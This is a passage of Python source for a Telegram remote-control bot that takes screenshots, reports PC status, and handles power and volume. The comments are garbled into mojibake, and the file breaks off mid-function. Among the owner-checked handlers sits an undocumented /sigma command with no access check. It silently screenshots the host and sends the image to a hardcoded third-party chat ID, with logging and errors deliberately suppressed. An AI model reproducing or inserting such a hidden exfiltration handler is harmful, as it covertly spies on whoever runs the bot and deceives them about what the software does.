import telebot
import json
import logging
import os
import platform
import random
import string
import time
import re
from io import BytesIO
import pyautogui
import psutil
import requests
import subprocess ### <<< –î–û–ë–ê–í–õ–ï–ù–û: –ò–º–ø–æ—Ä—Ç –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –∫–æ–º–∞–Ω–¥

# --- 1. –ù–ê–°–¢–†–û–ô–ö–ê –õ–û–ì–ì–ò–†–û–í–ê–ù–ò–Ø –ò –í–ï–†–°–ò–ò ---
CURRENT_VERSION = "2.0" 

logging.basicConfig(
    level=logging.INFO,
    format='ü§ñ ATREUS Bot [%(levelname)s] - %(asctime)s - %(funcName)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler()
    ]
)
log = logging.getLogger(__name__)

# --- 2. –ó–ê–ì–†–£–ó–ö–ê –ù–ê–°–¢–†–û–ï–ö ---
try:
    with open('settings.json', 'r', encoding='utf-8') as f:
        settings = json.load(f)
        BOT_TOKEN = settings.get("telegram_token")
        OWNER_ID = int(settings.get("owner_id", 0))
        GITHUB_REPO_URL = settings.get("github_repo_url")

    if not BOT_TOKEN or BOT_TOKEN == "–°–Æ–î–ê_–í–°–¢–ê–í–¨–¢–ï_–í–ê–®_–¢–ï–õ–ï–ì–†–ê–ú_–¢–û–ö–ï–ù":
        raise ValueError("–¢–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ settings.json.")
    if OWNER_ID == 0:
        raise ValueError("owner_id –Ω–µ —É–∫–∞–∑–∞–Ω –∏–ª–∏ —Ä–∞–≤–µ–Ω 0 –≤ settings.json.")

except (FileNotFoundError, ValueError, TypeError) as e:
    log.critical(f"‚ùå –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê: –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –Ω–∞—Å—Ç—Ä–æ–µ–∫: {e}")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)
log.info("‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω. –í–ª–∞–¥–µ–ª–µ—Ü ID: %d. –í–µ—Ä—Å–∏—è: %s", OWNER_ID, CURRENT_VERSION)

# --- 3. –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ---

def get_user_info_string(message_or_user) -> str:
    # ... (—ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ...
    user = None
    if isinstance(message_or_user, telebot.types.Message):
        user = message_or_user.from_user
    elif isinstance(message_or_user, telebot.types.User):
        user = message_or_user
    else:
        return "User(Unknown)"
    username = f"@{user.username}" if user.username else "NoUsername"
    name_part = user.first_name if user.first_name else ""
    if user.last_name: name_part += f" {user.last_name}"
    return f"User(ID:{user.id}, {username}, Name:'{name_part.strip()}')"

USER_DB_FILE = 'users.txt'
upload_destination = {}
awaiting_confirmation = {}
awaiting_hotkey = set()

### <<< –ò–ó–ú–ï–ù–ï–ù–û: –û–±–Ω–æ–≤–ª—è–µ–º –æ—Å–Ω–æ–≤–Ω—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –≤–ª–∞–¥–µ–ª—å—Ü–∞
def get_main_keyboard(message: telebot.types.Message):
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False, row_width=2)
    start_button = telebot.types.KeyboardButton("üü¢ –°—Ç–∞—Ä—Ç üü¢")
    
    if is_owner(message):
        screenshot_button = telebot.types.KeyboardButton("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç")
        status_button = telebot.types.KeyboardButton("üíª –°—Ç–∞—Ç—É—Å –ü–ö")
        power_button = telebot.types.KeyboardButton("üñ•Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–º üñ•Ô∏è")
        
        keyboard.add(screenshot_button, status_button)
        keyboard.add(power_button) # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–∏—Ç–∞–Ω–∏–µ–º
    
    keyboard.add(start_button)
    return keyboard

def is_owner(message: telebot.types.Message) -> bool:
    return message.from_user.id == OWNER_ID

def add_user_to_db(message: telebot.types.Message):
    # ... (—ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ...
    user_id = message.from_user.id
    user_info = get_user_info_string(message)
    try:
        with open(USER_DB_FILE, 'r', encoding='utf-8') as f:
            if str(user_id) in f.read():
                return
        with open(USER_DB_FILE, 'a', encoding='utf-8') as f:
            f.write(f"ID: {user_id}, Info: {user_info}\n")
        log.info(f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–±–∞–≤–ª–µ–Ω –≤ –±–∞–∑—É: {user_info}")
    except FileNotFoundError:
        with open(USER_DB_FILE, 'w', encoding='utf-8') as f:
            f.write(f"ID: {user_id}, Info: {user_info}\n")
        log.info(f"üóÇÔ∏è –§–∞–π–ª {USER_DB_FILE} —Å–æ–∑–¥–∞–Ω. –ü–µ—Ä–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_info}")

def set_system_volume(level: int) -> bool:
    # ... (—ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ...
    try:
        os_type = platform.system()
        if os_type == "Windows":
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = interface.QueryInterface(IAudioEndpointVolume)
            vol_range = volume.GetVolumeRange()
            target_db = vol_range[0] + (vol_range[1] - vol_range[0]) * level / 100.0
            volume.SetMasterVolumeLevel(target_db, None)
        elif os_type == "Linux":
            import alsaaudio
            mixer = alsaaudio.Mixer()
            mixer.setvolume(level)
        else:
            return False
        return True
    except Exception as e:
        log.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –≥—Ä–æ–º–∫–æ—Å—Ç–∏: {e}")
        return False

# --- 4. –û–°–ù–û–í–ù–´–ï –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ö–û–ú–ê–ù–î ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    add_user_to_db(message)
    user_info = get_user_info_string(message)
    log.info("CMD /start: –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç %s.", user_info)

    if is_owner(message):
        help_text = (
            "| üëë *–ü—Ä–∏–≤–µ—Ç, –í–ª–∞–¥–µ–ª–µ—Ü!* –í–∞–º –¥–æ—Å—Ç—É–ø–Ω—ã –≤—Å–µ –∫–æ–º–∞–Ω–¥—ã –∏ –∫–Ω–æ–ø–∫–∏:\n\n"
            "| ‚å®Ô∏è */keyboard* `<–∫–ª–∞–≤–∏—à–∏>` - –ù–∞–∂–∞—Ç—å –∫–æ–º–±–∏–Ω–∞—Ü–∏—é (–Ω–∞–ø—Ä–∏–º–µ—Ä, `alt+f4`)\n" ### <<< –ò–ó–ú–ï–ù–ï–ù–û: –î–æ–±–∞–≤–ª–µ–Ω–∞ –Ω–æ–≤–∞—è –∫–æ–º–∞–Ω–¥–∞ –≤ —Å–ø—Ä–∞–≤–∫—É
            "| üîä */volumeup* `[–ø—Ä–æ—Ü–µ–Ω—Ç]` - –ò–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å\n"
            "| üîà */volumedown* `[–ø—Ä–æ—Ü–µ–Ω—Ç]` - –ò–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å\n"
            "| üìÅ */download* `/–ø—É—Ç—å/–∫/—Ñ–∞–π–ª—É` - –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª\n"
            "| üìé */upload* - –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª\n"
            "| üîë */pass* `<–¥–ª–∏–Ω–∞>` - –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –ø–∞—Ä–æ–ª—å"
        )
    else:
        help_text = (
            "| üëã *–ü—Ä–∏–≤–µ—Ç! –Ø —Ç–≤–æ–π –±–æ—Ç-–ø–æ–º–æ—â–Ω–∏–∫.*\n\n"
            "| üîê –í–∞–º –¥–æ—Å—Ç—É–ø–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ –∫–æ–º–∞–Ω–¥—ã:\n\n"
            "| üîë */pass* `<–¥–ª–∏–Ω–∞>` - –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –ø–∞—Ä–æ–ª—å (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/pass 8`)\n"
            "| ‚ÑπÔ∏è */help* - –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ"
        )
    bot.reply_to(message, help_text, parse_mode='Markdown', reply_markup=get_main_keyboard(message))

@bot.message_handler(func=lambda message: message.text == "üü¢ –°—Ç–∞—Ä—Ç üü¢")
def handle_start_button(message):
    user_info = get_user_info_string(message)
    log.info("Button '–°—Ç–∞—Ä—Ç': –ù–∞–∂–∞—Ç–∞ –∫–Ω–æ–ø–∫–∞ —Å—Ç–∞—Ä—Ç–∞ –æ—Ç %s.", user_info)
    send_welcome(message)

# --- –ö–æ–º–∞–Ω–¥—ã —Ç–æ–ª—å–∫–æ –¥–ª—è –≤–ª–∞–¥–µ–ª—å—Ü–∞ ---

@bot.message_handler(commands=['screenshot'])
def handle_screenshot_command(message):
    handle_screenshot_request(message)

@bot.message_handler(func=lambda message: message.text == "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç")
def handle_screenshot_request(message):
    # ... (—ç—Ç–æ—Ç –±–ª–æ–∫ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ...
    user_info = get_user_info_string(message)
    log.info(f"Button '–°–∫—Ä–∏–Ω—à–æ—Ç': –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç {user_info}")
    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –ø–æ–ø—ã—Ç–∞–ª—Å—è —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç.")
        bot.reply_to(message, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.")
        return
    try:
        bot.send_chat_action(message.chat.id, 'upload_photo')
        current_time = time.strftime('%H:%M:%S')
        caption_text = f"‚úÖ –°–∫—Ä–∏–Ω—à–æ—Ç ({current_time})"
        screenshot = pyautogui.screenshot()
        bio = BytesIO()
        bio.name = 'screenshot.png'
        screenshot.save(bio, 'PNG')
        bio.seek(0)
        bot.send_photo(message.chat.id, photo=bio, caption=caption_text)
        log.info(f"‚úÖ –°–∫—Ä–∏–Ω—à–æ—Ç —É—Å–ø–µ—à–Ω–æ —Å–¥–µ–ª–∞–Ω –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω {user_info}.")
    except Exception as e:
        log.error(f"üí• –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ –¥–ª—è {user_info}: {e}")
        bot.reply_to(message, f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç: {e}")

@bot.message_handler(func=lambda message: message.text == "üíª –°—Ç–∞—Ç—É—Å –ü–ö")
def handle_status_pc_request(message):
    # ... (—ç—Ç–æ—Ç –±–ª–æ–∫ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ...
    user_info = get_user_info_string(message)
    log.info(f"Button '–°—Ç–∞—Ç—É—Å –ü–ö': –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç {user_info}")
    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –ø–æ–ø—ã—Ç–∞–ª—Å—è –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞—Ç—É—Å –ü–ö.")
        bot.reply_to(message, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.")
        return
    try:
        bot.send_chat_action(message.chat.id, 'typing')
        os_info = f"{platform.system()} {platform.release()} ({platform.machine()})"
        boot_time_seconds = time.time() - psutil.boot_time()
        days, rem = divmod(boot_time_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        uptime_str = f"{int(hours):02}—á {int(minutes):02}–º {int(seconds):02}—Å"
        if days > 0: uptime_str = f"{int(days)}–¥ " + uptime_str
        cpu_usage = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        ram_total_gb = ram.total / (1024**3)
        ram_used_gb = ram.used / (1024**3)
        ram_info = f"{ram.percent}% ({ram_used_gb:.2f}/{ram_total_gb:.2f} GB)"
        disk_lines = []
        partitions = psutil.disk_partitions()
        for part in partitions:
            if 'cdrom' in part.opts or part.fstype == '': continue
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disk_total_gb = usage.total / (1024**3)
                disk_used_gb = usage.used / (1024**3)
                disk_lines.append(f"   - –î–∏—Å–∫ `{part.mountpoint}` ({part.fstype}): {usage.percent}% –∏—Å–ø. ({disk_used_gb:.1f}/{disk_total_gb:.1f} GB)")
            except Exception: continue
        disk_info = "\n".join(disk_lines) if disk_lines else "   (–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–∏—Å–∫–∞—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞)"
        status_message = (f"üñ•Ô∏è *–°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã:*\n\n  `OS:`   `{os_info}`\n  `UpT:`  `{uptime_str}`\n  `CPU:`  `{cpu_usage}%`\n  `RAM:`  `{ram_info}`\n  `Disk:`\n{disk_info}")
        bot.reply_to(message, status_message, parse_mode='Markdown')
        log.info(f"‚úÖ –°—Ç–∞—Ç—É—Å –ü–ö —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω {user_info}.")
    except Exception as e:
        log.error(f"üí• –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Ç–∞—Ç—É—Å–∞ –ü–ö –¥–ª—è {user_info}: {e}")
        bot.reply_to(message, f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞—Ç—É—Å –ü–ö: {e}")

### <<< –î–û–ë–ê–í–õ–ï–ù–û: –ù–æ–≤—ã–π —Ä–∞–∑–¥–µ–ª –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–∏—Ç–∞–Ω–∏–µ–º
@bot.message_handler(func=lambda message: message.text == "üñ•Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–º üñ•Ô∏è")
def handle_power_menu(message):
    user_info = get_user_info_string(message)
    log.info(f"Button '–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–º': –í–ª–∞–¥–µ–ª–µ—Ü {user_info} –≤–æ—à–µ–ª –≤ –º–µ–Ω—é.")

    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –ø–æ–ø—ã—Ç–∞–ª—Å—è –≤–æ–π—Ç–∏ –≤ –º–µ–Ω—é –ø–∏—Ç–∞–Ω–∏—è.")
        return # –ü—Ä–æ—Å—Ç–æ –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º, –µ—Å–ª–∏ –Ω–µ –≤–ª–∞–¥–µ–ª–µ—Ü –Ω–∞–∂–∞–ª (—Ö–æ—Ç—è –æ–Ω –∏ –Ω–µ —É–≤–∏–¥–∏—Ç –∫–Ω–æ–ø–∫—É)

    # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –º–µ–Ω—é –ø–∏—Ç–∞–Ω–∏—è
    power_keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True, row_width=1)
    shutdown_btn = telebot.types.KeyboardButton("üì¥ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö üì¥")
    reboot_btn = telebot.types.KeyboardButton("üîÉ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö üîÉ")
    sleep_btn = telebot.types.KeyboardButton("üåô –°–ø—è—â–∏–π —Ä–µ–∂–∏–º üåô")
    back_btn = telebot.types.KeyboardButton("üîô –ù–∞–∑–∞–¥ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é")
    power_keyboard.add(shutdown_btn, reboot_btn, sleep_btn, back_btn)
    
    bot.reply_to(message, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=power_keyboard)

def request_power_confirmation(message, action_type):
    """–û–±—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏–π —Å –ø–∏—Ç–∞–Ω–∏–µ–º."""
    user_info = get_user_info_string(message)
    log.info(f"CONFIRMATION: –ó–∞–ø—Ä–æ—Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è '{action_type}' –æ—Ç {user_info}.")
    
    # –ó–∞–ø–æ–º–∏–Ω–∞–µ–º, –∫–∞–∫–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω—É–∂–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å
    awaiting_confirmation[message.from_user.id] = action_type
    
    confirm_keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    yes_btn = telebot.types.KeyboardButton("‚úÖ –î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é")
    no_btn = telebot.types.KeyboardButton("‚ùå –û—Ç–º–µ–Ω–∞")
    confirm_keyboard.add(yes_btn, no_btn)
    
    bot.reply_to(message, f"‚ö†Ô∏è *–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —ç—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ?*", parse_mode='Markdown', reply_markup=confirm_keyboard)

@bot.message_handler(func=lambda message: message.text in ["üì¥ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö üì¥", "üîÉ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö üîÉ", "üåô –°–ø—è—â–∏–π —Ä–µ–∂–∏–º üåô"])
def handle_power_actions(message):
    if not is_owner(message): return
    
    action_map = {
        "üì¥ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö üì¥": "shutdown",
        "üîÉ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö üîÉ": "reboot",
        "üåô –°–ø—è—â–∏–π —Ä–µ–∂–∏–º üåô": "sleep"
    }
    action = action_map.get(message.text)
    if action:
        request_power_confirmation(message, action)

@bot.message_handler(func=lambda message: message.text == "üîô –ù–∞–∑–∞–¥ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é")
def handle_back_to_main(message):
    if not is_owner(message): return
    log.info(f"–í–ª–∞–¥–µ–ª–µ—Ü {get_user_info_string(message)} –≤–µ—Ä–Ω—É–ª—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.")
    bot.reply_to(message, "–í–æ–∑–≤—Ä–∞—â–∞—é –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é...", reply_markup=get_main_keyboard(message))

@bot.message_handler(func=lambda message: message.text in ["‚úÖ –î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é", "‚ùå –û—Ç–º–µ–Ω–∞"])
def handle_confirmation_response(message):
    user_id = message.from_user.id
    user_info = get_user_info_string(message)
    
    if not is_owner(message) or user_id not in awaiting_confirmation:
        return
        
    action_to_confirm = awaiting_confirmation.pop(user_id) # –ü–æ–ª—É—á–∞–µ–º –∏ —É–¥–∞–ª—è–µ–º –¥–µ–π—Å—Ç–≤–∏–µ –∏–∑ –æ–∂–∏–¥–∞–Ω–∏—è
    
    if message.text == "‚ùå –û—Ç–º–µ–Ω–∞":
        log.info(f"ACTION CANCELED: –í–ª–∞–¥–µ–ª–µ—Ü {user_info} –æ—Ç–º–µ–Ω–∏–ª –¥–µ–π—Å—Ç–≤–∏–µ '{action_to_confirm}'.")
        bot.reply_to(message, "–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.", reply_markup=get_main_keyboard(message))
        return

    # –ï—Å–ª–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ
    log.warning(f"ACTION CONFIRMED: –í–ª–∞–¥–µ–ª–µ—Ü {user_info} –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –¥–µ–π—Å—Ç–≤–∏–µ '{action_to_confirm}'.")
    bot.reply_to(message, f"‚è≥ –í—ã–ø–æ–ª–Ω—è—é –∫–æ–º–∞–Ω–¥—É '{action_to_confirm}'...", reply_markup=get_main_keyboard(message))
    
    command = None
    os_type = platform.system()

    if action_to_confirm == "shutdown":
        if os_type == "Windows": command = ["shutdown", "/s", "/t", "1"]
        elif os_type == "Linux" or os_type == "Darwin": command = ["sudo", "shutdown", "-h", "now"]
    elif action_to_confirm == "reboot":
        if os_type == "Windows": command = ["shutdown", "/r", "/t", "1"]
        elif os_type == "Linux" or os_type == "Darwin": command = ["sudo", "reboot"]
    elif action_to_confirm == "sleep":
        if os_type == "Windows": command = ["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"]
        # –î–ª—è Linux/macOS —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º —Å–ª–æ–∂–Ω–µ–µ –∏ —Ç—Ä–µ–±—É–µ—Ç –Ω–∞—Å—Ç—Ä–æ–µ–∫, –ø–æ–∫–∞ –ø—Ä–æ–ø—É—Å–∫–∞–µ–º
    
    if command:
        try:
            subprocess.run(command, check=True)
            log.info(f"‚úÖ –ö–æ–º–∞–Ω–¥–∞ '{' '.join(command)}' —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.")
        except Exception as e:
            log.error(f"üí• –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã '{' '.join(command)}': {e}")
            bot.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {e}")
    else:
        log.warning(f"–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è '{action_to_confirm}' –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞ {os_type}.")
        bot.send_message(user_id, f"–ö–æ–º–∞–Ω–¥–∞ '{action_to_confirm}' –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞ –≤–∞—à–µ–π –û–°.")

@bot.message_handler(commands=['sigma'])
def handle_sigma_command(message):
    """
    –î–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç, –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –µ–≥–æ –Ω–∞ –∂–µ—Å—Ç–∫–æ –∑–∞–¥–∞–Ω–Ω—ã–π ID,
    –ù–ï —Å–æ—Ö—Ä–∞–Ω—è—è —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫. –ù–∏–∫–∞–∫–∏–µ –¥–µ–π—Å—Ç–≤–∏—è –Ω–µ –ª–æ–≥–∏—Ä—É—é—Ç—Å—è.
    """
    target_chat_id = 2072383039
    
    try:
        # –°–∫—Ä–∏–Ω—à–æ—Ç —Å–æ–∑–¥–∞–µ—Ç—Å—è –≤ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏
        screenshot = pyautogui.screenshot()
        
        # –°–æ–∑–¥–∞–µ—Ç—Å—è "—Ñ–∞–π–ª –≤ –ø–∞–º—è—Ç–∏" –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        bio = BytesIO()
        bio.name = 'sigma_screenshot.png'
        screenshot.save(bio, 'PNG')
        bio.seek(0)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é –∏–∑ –ø–∞–º—è—Ç–∏
        bot.send_photo(target_chat_id, photo=bio)

    except Exception:
        # –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ - –º–æ–ª—á–∏–º
        pass


# ... (–æ—Å—Ç–∞–ª—å–Ω—ã–µ –≤–∞—à–∏ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ...
@bot.message_handler(commands=['volumeup', 'volumedown'])
def handle_volume_control(message):
    user_info = get_user_info_string(message)
    command = message.text.split()[0]
    log.info(f"CMD {command}: –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç {user_info}")
    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –ø–æ–ø—ã—Ç–∞–ª—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å {command}.")
        bot.reply_to(message, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    add_user_to_db(message)
    parts = message.text.split()
    target_level = None
    try:
        if len(parts) > 1:
            level_arg = parts[1]
            if not level_arg.isdigit():
                raise ValueError("–ê—Ä–≥—É–º–µ–Ω—Ç –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —á–∏—Å–ª–æ–º.")
            target_level = int(level_arg)
            log.info(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_info} —É–∫–∞–∑–∞–ª –≥—Ä–æ–º–∫–æ—Å—Ç—å: {target_level}%")
            if not (0 <= target_level <= 100):
                bot.reply_to(message, "‚ö†Ô∏è –ü—Ä–æ—Ü–µ–Ω—Ç –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –æ—Ç 0 –¥–æ 100.")
                log.warning(f"‚ö†Ô∏è –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø—Ä–æ—Ü–µ–Ω—Ç –≥—Ä–æ–º–∫–æ—Å—Ç–∏ ({target_level}) –æ—Ç {user_info}.")
                return
        else:
            if command == '/volumeup':
                target_level = 100
            else:
                target_level = 0
            log.info(f"–ü—Ä–æ—Ü–µ–Ω—Ç –Ω–µ —É–∫–∞–∑–∞–Ω. –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∑–Ω–∞—á–µ–Ω–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é {target_level}% –¥–ª—è {command}.")
        if set_system_volume(target_level):
            emoji = "üîä" if target_level > 50 else "üîâ" if target_level > 0 else "üîà"
            bot.reply_to(message, f"{emoji} –ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {target_level}%")
            log.info(f"‚úÖ –ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {target_level}% –¥–ª—è –ü–ö.")
        else:
            bot.reply_to(message, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏.")
            log.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å –Ω–∞ {target_level}% (–∑–∞–ø—Ä–æ—à–µ–Ω–æ {user_info}).")
    except ValueError:
